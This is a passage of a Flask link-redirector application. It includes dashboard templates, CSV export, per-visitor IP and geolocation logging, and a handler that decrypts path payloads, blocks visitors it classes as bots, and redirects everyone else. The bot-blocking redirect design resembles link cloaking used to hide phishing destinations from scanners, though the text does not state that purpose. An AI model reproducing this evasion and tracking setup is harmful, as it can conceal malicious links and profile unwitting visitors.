                                                            y: { title: { display: true, text: 'Clicks' }, beginAtZero: true }
                                                        }
                                                    }
                                                });
                                            </script>
                                            <div class="mt-4">
                                                <label class="block text-sm font-medium text-gray-700">Filter by Device</label>
                                                <select id="filter-device-{{ loop.index }}" onchange="applyFilters('{{ loop.index }}')" class="mt-1 w-full p-3 border rounded-lg">
                                                    <option value="">All</option>
                                                    <option value="Mobile">Mobile</option>
                                                    <option value="Tablet">Tablet</option>
                                                    <option value="Desktop">Desktop</option>
                                                </select>
                                            </div>
                                            <div class="mt-4">
                                                <label class="block text-sm font-medium text-gray-700">Filter by Type</label>
                                                <select id="filter-type-{{ loop.index }}" onchange="applyFilters('{{ loop.index }}')" class="mt-1 w-full p-3 border rounded-lg">
                                                    <option value="">All</option>
                                                    <option value="Human">Human</option>
                                                    <option value="Bot">Bot</option>
                                                    <option value="Mimicry">Mimicry</option>
                                                    <option value="App">App</option>
                                                </select>
                                            </div>
                                            <a href="/export/{{ loop.index }}" class="mt-4 inline-block bg-green-600 text-white px-4 py-2 rounded-lg hover:bg-green-700">Export as CSV</a>
                                            <div class="table-container mt-4">
                                                <table>
                                                    <thead>
                                                        <tr class="bg-gray-200">
                                                            <th>Timestamp</th>
                                                            <th>IP</th>
                                                            <th>Device Type</th>
                                                            <th>Screen Type</th>
                                                            <th>App</th>
                                                            <th>Type</th>
                                                            <th>Country</th>
                                                            <th>Region</th>
                                                            <th>City</th>
                                                        </tr>
                                                    </thead>
                                                    <tbody id="visits-{{ loop.index }}">
                                                        {% for visit in url.visits %}
                                                            <tr class="{% if visit.type != 'Human' %}bot{% endif %}">
                                                                <td>{{ visit.timestamp|datetime }}</td>
                                                                <td>{{ visit.ip }}</td>
                                                                <td>{{ visit.device_type }}</td>
                                                                <td>{{ visit.screen_type }}</td>
                                                                <td>{{ visit.app }}</td>
                                                                <td>{{ visit.type }}</td>
                                                                <td>{{ visit.location.country }}</td>
                                                                <td>{{ visit.location.region }}</td>
                                                                <td>{{ visit.location.city }}</td>
                                                            </tr>
                                                        {% endfor %}
                                                    </tbody>
                                                </table>
                                            </div>
                                        </div>
                                    </div>
                                {% endfor %}
                            {% else %}
                                <p class="text-gray-600">No URLs generated yet.</p>
                            {% endif %}
                        </div>
                    </div>
                    <div id="visitors-tab" class="tab-content hidden">
                        <div class="bg-white p-8 rounded-xl card">
                            <div class="flex justify-between items-center mb-4">
                                <h2 class="text-2xl font-bold text-gray-900">Visitor Views</h2>
                                <button onclick="refreshDashboard()" class="refresh-btn bg-blue-600 text-white px-4 py-2 rounded-lg hover:bg-blue-700">Refresh</button>
                            </div>
                            {% if visitors %}
                                <div class="table-container">
                                    <table>
                                        <thead>
                                            <tr class="bg-gray-200">
                                                <th>Timestamp</th>
                                                <th>IP</th>
                                                <th>Country</th>
                                                <th>Country Code</th>
                                                <th>Region</th>
                                                <th>Region Code</th>
                                                <th>City</th>
                                                <th>Zip</th>
                                                <th>Latitude</th>
                                                <th>Longitude</th>
                                                <th>ISP</th>
                                                <th>Organization</th>
                                                <th>AS Number</th>
                                                <th>Timezone</th>
                                                <th>Device Type</th>
                                                <th>Screen Type</th>
                                                <th>Application</th>
                                                <th>User Agent</th>
                                                <th>Bot Status</th>
                                                <th>Block Reason</th>
                                                <th>Source</th>
                                                <th>Session Duration (s)</th>
                                            </tr>
                                        </thead>
                                        <tbody>
                                            {% for visitor in visitors %}
                                                <tr class="{% if visitor.bot_status != 'Human' %}bot{% endif %}">
                                                    <td>{{ visitor.timestamp }}</td>
                                                    <td>{{ visitor.ip }}</td>
                                                    <td>{{ visitor.country }}</td>
                                                    <td>{{ visitor.country_code }}</td>
                                                    <td>{{ visitor.region }}</td>
                                                    <td>{{ visitor.region_code }}</td>
                                                    <td>{{ visitor.city }}</td>
                                                    <td>{{ visitor.zip }}</td>
                                                    <td>{{ visitor.latitude }}</td>
                                                    <td>{{ visitor.longitude }}</td>
                                                    <td>{{ visitor.isp }}</td>
                                                    <td>{{ visitor.organization }}</td>
                                                    <td>{{ visitor.as_number }}</td>
                                                    <td>{{ visitor.timezone }}</td>
                                                    <td>{{ visitor.device_type }}</td>
                                                    <td>{{ visitor.screen_type }}</td>
                                                    <td>{{ visitor.application }}</td>
                                                    <td>{{ visitor.user_agent }}</td>
                                                    <td>{{ visitor.bot_status }}</td>
                                                    <td>{{ visitor.block_reason }}</td>
                                                    <td>{{ visitor.source }}</td>
                                                    <td>{{ visitor.session_duration }}</td>
                                                </tr>
                                            {% endfor %}
                                        </tbody>
                                    </table>
                                </div>
                                <a href="/export_visitors" class="mt-4 inline-block bg-green-600 text-white px-4 py-2 rounded-lg hover:bg-green-700">Export Visitors as CSV</a>
                            {% else %}
                                <p class="text-gray-600">No visitor data available.</p>
                            {% endif %}
                        </div>
                    </div>
                    <div id="bot-logs-tab" class="tab-content hidden">
                        <div class="bg-white p-8 rounded-xl card">
                            <h2 class="text-2xl font-bold mb-6 text-gray-900">Bot Detection Logs</h2>
                            {% if bot_logs %}
                                <div class="table-container">
                                    <table>
                                        <thead>
                                            <tr class="bg-gray-200">
                                                <th>Timestamp</th>
                                                <th>IP</th>
                                                <th>Block Reason</th>
                                            </tr>
                                        </thead>
                                        <tbody>
                                            {% for log in bot_logs %}
                                                <tr class="bot">
                                                    <td>{{ log.timestamp|datetime }}</td>
                                                    <td>{{ log.ip }}</td>
                                                    <td>{{ log.block_reason }}</td>
                                                </tr>
                                            {% endfor %}
                                        </tbody>
                                    </table>
                                </div>
                            {% else %}
                                <p class="text-gray-600">No bot detections logged.</p>
                            {% endif %}
                        </div>
                    </div>
                    <div id="analytics-tab" class="tab-content hidden">
                        <div class="bg-white p-8 rounded-xl card">
                            <h2 class="text-2xl font-bold mb-6 text-gray-900">Traffic Analytics</h2>
                            <div class="grid grid-cols-2 gap-4">
                                <div>
                                    <h3 class="text-lg font-semibold mb-4">Traffic Sources</h3>
                                    <canvas id="traffic-source-chart"></canvas>
                                    <script>
                                        new Chart(document.getElementById('traffic-source-chart'), {
                                            type: 'pie',
                                            data: {
                                                labels: {{ traffic_sources_keys|tojson }},
                                                datasets: [{
                                                    data: {{ traffic_sources_values|tojson }},
                                                    backgroundColor: ['#4f46e5', '#7c3aed', '#3b82f6']
                                                }]
                                            },
                                            options: { responsive: true, plugins: { legend: { position: 'top' } } }
                                        });
                                    </script>
                                </div>
                                <div>
                                    <h3 class="text-lg font-semibold mb-4">Bot vs Human Ratio</h3>
                                    <canvas id="bot-ratio-chart"></canvas>
                                    <script>
                                        new Chart(document.getElementById('bot-ratio-chart'), {
                                            type: 'doughnut',
                                            data: {
                                                labels: {{ bot_ratio_keys|tojson }},
                                                datasets: [{
                                                    data: {{ bot_ratio_values|tojson }},
                                                    backgroundColor: ['#10b981', '#ef4444']
                                                }]
                                            },
                                            options: { responsive: true, plugins: { legend: { position: 'top' } } }
                                        });
                                    </script>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </body>
            </html>
        """, username=username, form=form, urls=urls, visitors=visitors, bot_logs=bot_logs,
           traffic_sources_keys=traffic_sources_keys, traffic_sources_values=traffic_sources_values,
           bot_ratio_keys=bot_ratio_keys, bot_ratio_values=bot_ratio_values,
           primary_color=primary_color, error=error, valkey_error=valkey_error)
    except Exception as e:
        logger.error(f"Dashboard error: {str(e)}")
        return render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Internal Server Error</title>
                <script src="https://cdn.tailwindcss.com"></script>
            </head>
            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
                    <h3 class="text-lg font-bold mb-4 text-red-600">Internal Server Error</h3>
                    <p class="text-gray-600">Something went wrong. Please try again later.</p>
                </div>
            </body>
            </html>
        """), 500

@app.route("/toggle_analytics/<url_id>", methods=["POST"])
@login_required
@csrf.exempt
def toggle_analytics(url_id):
    try:
        username = session['username']
        data = request.get_json()
        if not data or 'csrf_token' not in data:
            return jsonify({"status": "error", "message": "CSRF token required"}), 403
        form = GenerateURLForm(csrf_token=data['csrf_token'])
        if not form.validate_csrf_token(form.csrf_token):
            return jsonify({"status": "error", "message": "Invalid CSRF token"}), 403
        if valkey_client:
            key = f"user:{username}:url:{url_id}"
            if not valkey_client.exists(key):
                return jsonify({"status": "error", "message": "URL not found"}), 404
            current = valkey_client.hget(key, "analytics_enabled")
            new_value = "0" if current == "1" else "1"
            valkey_client.hset(key, "analytics_enabled", new_value)
            return jsonify({"status": "ok"}), 200
        return jsonify({"status": "error", "message": "Database unavailable"}), 500
    except Exception as e:
        logger.error(f"Error in toggle_analytics: {str(e)}")
        return jsonify({"status": "error", "message": "Internal server error"}), 500

@app.route("/clear_views/<url_id>", methods=["GET"])
@login_required
def clear_views(url_id):
    try:
        username = session['username']
        if valkey_client:
            key = f"user:{username}:url:{url_id}"
            if not valkey_client.exists(key):
                abort(404, "URL not found")
            valkey_client.delete(f"user:{username}:url:{url_id}:visits")
            valkey_client.hset(key, "clicks", 0)
            return redirect(url_for('dashboard'))
        return render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Error</title>
                <script src="https://cdn.tailwindcss.com"></script>
            </head>
            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
                    <h3 class="text-lg font-bold mb-4 text-red-600">Error</h3>
                    <p class="text-gray-600">Database unavailable.</p>
                </div>
            </body>
            </html>
        """), 500
    except Exception as e:
        logger.error(f"Error in clear_views: {str(e)}")
        return render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Internal Server Error</title>
                <script src="https://cdn.tailwindcss.com"></script>
            </head>
            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
                    <h3 class="text-lg font-bold mb-4 text-red-600">Internal Server Error</h3>
                    <p class="text-gray-600">Something went wrong.</p>
                </div>
            </body>
            </html>
        """), 500

@app.route("/delete_url/<url_id>", methods=["GET"])
@login_required
def delete_url(url_id):
    try:
        username = session['username']
        if valkey_client:
            key = f"user:{username}:url:{url_id}"
            if not valkey_client.exists(key):
                abort(404, "URL not found")
            valkey_client.delete(key)
            valkey_client.delete(f"user:{username}:url:{url_id}:visits")
            valkey_client.delete(f"url_payload:{url_id}")
            return redirect(url_for('dashboard'))
        return render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Error</title>
                <script src="https://cdn.tailwindcss.com"></script>
            </head>
            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
                    <h3 class="text-lg font-bold mb-4 text-red-600">Error</h3>
                    <p class="text-gray-600">Database unavailable.</p>
                </div>
            </body>
            </html>
        """), 500
    except Exception as e:
        logger.error(f"Error in delete_url: {str(e)}")
        return render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Internal Server Error</title>
                <script src="https://cdn.tailwindcss.com"></script>
            </head>
            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
                    <h3 class="text-lg font-bold mb-4 text-red-600">Internal Server Error</h3>
                    <p class="text-gray-600">Something went wrong.</p>
                </div>
            </body>
            </html>
        """), 500

@app.route("/export_visitors", methods=["GET"])
@login_required
def export_visitors():
    try:
        username = session['username']
        if valkey_client:
            visitor_ids = valkey_client.zrevrange(f"user:{username}:visitor_log", 0, -1)
            visitor_data = []
            for visitor_id in visitor_ids:
                visitor = valkey_client.hgetall(f"user:{username}:visitor:{visitor_id}")
                visitor_data.append(visitor)
            output = StringIO()
            writer = csv.writer(output)
            writer.writerow([
                'Timestamp', 'IP', 'Country', 'Country Code', 'Region', 'Region Code',
                'City', 'Zip', 'Latitude', 'Longitude', 'ISP', 'Organization',
                'AS Number', 'Timezone', 'Device Type', 'Screen Type', 'Application',
                'User Agent', 'Bot Status', 'Block Reason', 'Source', 'Session Duration (s)'
            ])
            for visitor in visitor_data:
                writer.writerow([
                    datetime.fromtimestamp(int(visitor.get('timestamp', 0))).strftime('%Y-%m-%d %H:%M:%S') if visitor.get('timestamp') else 'N/A',
                    visitor.get('ip', 'N/A'),
                    visitor.get('country', 'N/A'),
                    visitor.get('country_code', 'N/A'),
                    visitor.get('region', 'N/A'),
                    visitor.get('region_code', 'N/A'),
                    visitor.get('city', 'N/A'),
                    visitor.get('zip', 'N/A'),
                    visitor.get('latitude', '0.0'),
                    visitor.get('longitude', '0.0'),
                    visitor.get('isp', 'N/A'),
                    visitor.get('organization', 'N/A'),
                    visitor.get('as_number', 'N/A'),
                    visitor.get('timezone', 'UTC'),
                    visitor.get('device_type', 'N/A'),
                    visitor.get('screen_type', 'N/A'),
                    visitor.get('application', 'N/A'),
                    visitor.get('user_agent', 'N/A'),
                    visitor.get('bot_status', 'N/A'),
                    visitor.get('block_reason', 'N/A'),
                    visitor.get('source', 'direct'),
                    visitor.get('session_duration', '0')
                ])
            output.seek(0)
            return Response(
                output.getvalue(),
                mimetype='text/csv',
                headers={"Content-Disposition": f"attachment;filename=visitors_{username}.csv"}
            )
        return render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Error</title>
                <script src="https://cdn.tailwindcss.com"></script>
            </head>
            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
                    <h3 class="text-lg font-bold mb-4 text-red-600">Error</h3>
                    <p class="text-gray-600">Database unavailable.</p>
                </div>
            </body>
            </html>
        """), 500
    except Exception as e:
        logger.error(f"Error in export_visitors: {str(e)}")
        return render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Internal Server Error</title>
                <script src="https://cdn.tailwindcss.com"></script>
            </head>
            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
                    <h3 class="text-lg font-bold mb-4 text-red-600">Internal Server Error</h3>
                    <p class="text-gray-600">Something went wrong.</p>
                </div>
            </body>
            </html>
        """), 500

@app.route("/export/<int:index>", methods=["GET"])
@login_required
def export(index):
    try:
        username = session['username']
        if valkey_client:
            url_keys = valkey_client.keys(f"user:{username}:url:*")
            if index <= 0 or index > len(url_keys):
                abort(404, "URL not found")
            key = url_keys[index-1]
            url_id = key.split(':')[-1]
            visits = valkey_client.lrange(f"user:{username}:url:{url_id}:visits", 0, -1)
            visit_data = []
            for v in visits:
                try:
                    visit_data.append(json.loads(v))
                except:
                    pass
            output = StringIO()
            writer = csv.writer(output)
            writer.writerow(['Timestamp', 'IP', 'Device Type', 'Screen Type', 'App', 'Type', 'Country', 'Region', 'City'])
            for visit in visit_data:
                writer.writerow([
                    datetime.fromtimestamp(visit.get('timestamp', 0)).strftime('%Y-%m-%d %H:%M:%S') if visit.get('timestamp') else 'N/A',
                    visit.get('ip', 'N/A'),
                    visit.get('device_type', 'N/A'),
                    visit.get('screen_type', 'N/A'),
                    visit.get('app', 'N/A'),
                    visit.get('type', 'N/A'),
                    visit.get('location', {}).get('country', 'N/A'),
                    visit.get('location', {}).get('region', 'N/A'),
                    visit.get('location', {}).get('city', 'N/A')
                ])
            output.seek(0)
            return Response(
                output.getvalue(),
                mimetype='text/csv',
                headers={"Content-Disposition": f"attachment;filename=visits_{url_id}.csv"}
            )
        return render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Error</title>
                <script src="https://cdn.tailwindcss.com"></script>
            </head>
            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
                    <h3 class="text-lg font-bold mb-4 text-red-600">Error</h3>
                    <p class="text-gray-600">Database unavailable.</p>
                </div>
            </body>
            </html>
        """), 500
    except Exception as e:
        logger.error(f"Error in export: {str(e)}")
        return render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Internal Server Error</title>
                <script src="https://cdn.tailwindcss.com"></script>
            </head>
            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
                    <h3 class="text-lg font-bold mb-4 text-red-600">Internal Server Error</h3>
                    <p class="text-gray-600">Something went wrong.</p>
                </div>
            </body>
            </html>
        """), 500

@app.route("/challenge", methods=["POST"])
def challenge():
    try:
        data = request.get_json()
        if not data or 'challenge' not in data or not isinstance(data['challenge'], (int, float)):
            return {"status": "denied"}, 403
        session['js_verified'] = True
        session.permanent = True
        session.modified = True
        return {"status": "ok"}, 200
    except:
        return {"status": "error"}, 500

@app.route("/fingerprint", methods=["POST"])
def fingerprint():
    try:
        data = request.get_json()
        if data and 'fingerprint' in data:
            fingerprint = generate_fingerprint()
            if valkey_client:
                valkey_client.setex(f"fingerprint:{fingerprint}", 3600, data['fingerprint'])
        return {"status": "ok"}, 200
    except:
        return {"status": "error"}, 500

@app.route("/<endpoint>/<path:encrypted_payload>/<path:path_segment>/<random_suffix>", methods=["GET"], subdomain="<username>")
@rate_limit(limit=5, per=60)
def redirect_handler(username, endpoint, encrypted_payload, path_segment, random_suffix):
    try:
        base_domain = get_base_domain()
        user_agent = request.headers.get("User-Agent", "")
        ip = request.remote_addr
        headers = request.headers
        referer = headers.get("Referer", "")
        session_start = session.get('session_start', int(time.time()))
        session['session_start'] = session_start

        is_bot_flag, bot_reason = is_bot(user_agent, headers, ip, request.path)
        device_info = get_device_info(user_agent)
        visit_type = "Human"
        if is_bot_flag:
            visit_type = "Bot" if "curl/" in user_agent.lower() else "Mimicry" if "Mimicry" in bot_reason else "Bot"
        elif device_info['application'] != "N/A":
            visit_type = "App"

        location = get_geoip(ip)
        session_duration = int(time.time()) - session_start
        timestamp = int(time.time())
        visitor_id = hashlib.sha256(f"{ip}{timestamp}".encode()).hexdigest()

        url_id = hashlib.sha256(f"{endpoint}{encrypted_payload}".encode()).hexdigest()
        if valkey_client:
            analytics_enabled = valkey_client.hget(f"user:{username}:url:{url_id}", "analytics_enabled") == "1"
            if analytics_enabled:
                valkey_client.hset(f"user:{username}:visitor:{visitor_id}", mapping={
                    "timestamp": timestamp, "ip": ip, "country": location['country'],
                    "country_code": location['country_code'], "region": location['region'],
                    "region_code": location['region_code'], "city": location['city'],
                    "zip": location['zip'], "latitude": str(location['latitude']),
                    "longitude": str(location['longitude']), "isp": location['isp'],
                    "organization": location['organization'], "as_number": location['as_number'],
                    "timezone": location['timezone'], "device_type": device_info['device_type'],
                    "screen_type": device_info['screen_type'], "application": device_info['application'],
                    "user_agent": user_agent, "bot_status": visit_type,
                    "block_reason": bot_reason if is_bot_flag else "N/A", "referer": referer,
                    "source": 'referral' if referer else 'direct', "session_duration": session_duration
                })
                valkey_client.zadd(f"user:{username}:visitor_log", {visitor_id: timestamp})
                valkey_client.expire(f"user:{username}:visitor:{visitor_id}", DATA_RETENTION_DAYS * 86400)
                valkey_client.hincrby(f"user:{username}:url:{url_id}", "clicks", 1)
                valkey_client.lpush(f"user:{username}:url:{url_id}:visits", json.dumps({
                    "timestamp": timestamp, "ip": ip, "device_type": device_info['device_type'],
                    "screen_type": device_info['screen_type'], "app": device_info['application'],
                    "type": visit_type, "location": location
                }))
                valkey_client.expire(f"user:{username}:url:{url_id}:visits", DATA_RETENTION_DAYS * 86400)

        if is_bot_flag:
            abort(403, f"Access denied: {bot_reason}")

        encrypted_payload = urllib.parse.unquote(encrypted_payload)
        payload = None
        if valkey_client:
            cached_payload = valkey_client.get(f"url_payload:{url_id}")
            if cached_payload:
                payload = cached_payload

        if not payload:
            data = decrypt_slugstorm(encrypted_payload)
            payload = data['payload']
            if valkey_client:
                expiry = json.loads(payload).get('expiry', int(time.time()) + 86400)
                ttl = max(1, int(expiry - time.time()))
                valkey_client.setex(f"url_payload:{url_id}", ttl, payload)

        data = json.loads(payload)
        redirect_url = data.get("student_link")
        expiry = data.get("expiry", float('inf'))
        if not redirect_url or not re.match(r"^https?://", redirect_url):
            abort(400, "Invalid redirect URL")
        if time.time() > expiry:
            if valkey_client:
                valkey_client.delete(f"url_payload:{url_id}")
            abort(410, "URL expired")

        return redirect(redirect_url.rstrip('/'), code=302)
    except Exception as e:
        logger.error(f"Error in redirect_handler: {str(e)}")
        return render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Invalid Link</title>
                <script src="https://cdn.tailwindcss.com"></script>
            </head>
            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
                    <h3 class="text-lg font-bold mb-4 text-red-600">Invalid Link</h3>
                    <p class="text-gray-600">The link is invalid or has expired.</p>
                </div>
            </body>
            </html>
        """), 400

@app.route("/<endpoint>/<path:encrypted_payload>/<path:path_segment>/<random_suffix>", methods=["GET"])
@rate_limit(limit=5, per=60)
def redirect_handler_no_subdomain(endpoint, encrypted_payload, path_segment, random_suffix):
    host = request.host
    username = host.split('.')[0] if '.' in host else "default"
    return redirect_handler(username, endpoint, encrypted_payload, path_segment, random_suffix)

@app.route("/denied", methods=["GET"])
def denied():
    return render_template_string("""
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="robots" content="noindex, nofollow">
            <title>Access Denied</title>
            <script src="https://cdn.tailwindcss.com"></script>
        </head>
        <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
            <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
                <h3 class="text-lg font-bold mb-4 text-red-600">Access Denied</h3>
                <p class="text-gray-600">Suspicious activity detected.</p>
            </div>
        </body>
        </html>
    """), 403

@app.route("/<path:path>", methods=["GET"])
def catch_all(path):
    logger.warning(f"404 Not Found: {path}")
    return render_template_string("""
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Not Found</title>
            <script src="https://cdn.tailwindcss.com"></script>
        </head>
        <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
            <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
                <h3 class="text-lg font-bold mb-4 text-red-600">Not Found</h3>
                <p class="text-gray-600">The requested URL was not found.</p>
            </div>
        </body>
        </html>
    """), 404

def generate_random_string(length):
    try:
        characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        return "".join(secrets.choice(characters) for _ in range(length))
    except:
        return secrets.token_hex(length // 2)

if __name__ == "__main__":
    try:
        app.run(host="0.0.0.0", port=5000, debug=False)
    except Exception as e:
        logger.error(f"Error starting Flask app: {str(e)}")
        import sys
        sys.exit(1)
